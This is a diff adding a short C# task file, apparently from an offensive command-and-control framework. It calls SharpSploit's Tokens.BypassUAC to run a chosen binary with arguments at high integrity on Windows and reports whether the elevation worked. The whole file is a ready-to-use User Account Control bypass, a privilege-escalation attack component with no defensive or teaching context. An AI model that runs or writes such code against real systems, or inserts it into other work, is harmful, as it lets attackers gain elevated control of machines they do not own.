@@ -1,0 +1,26 @@
+﻿using System;
+
+using SharpSploit.Credentials;
+
+public static class Task
+{
+    public static string Execute(string Binary, string Arguments, string Path, string ProcessID = "0")
+    {
+        Console.WriteLine("Binary:" + Binary);
+        Console.WriteLine("Arguments:" + Arguments);
+        Console.WriteLine("Path:" + Path);
+        Console.WriteLine("ProcessID:" + ProcessID);
+
+        using (Tokens t = new Tokens())
+        {
+            if (t.BypassUAC(Binary, Arguments, Path, Int32.Parse(ProcessID)))
+            {
+                return "Successfully executed: \"" + Path + Binary + " " + Arguments + "\" with high integrity.";
+            }
+            else
+            {
+                return "Failed to execute with high integrity.";
+            }
+        }
+    }
+}
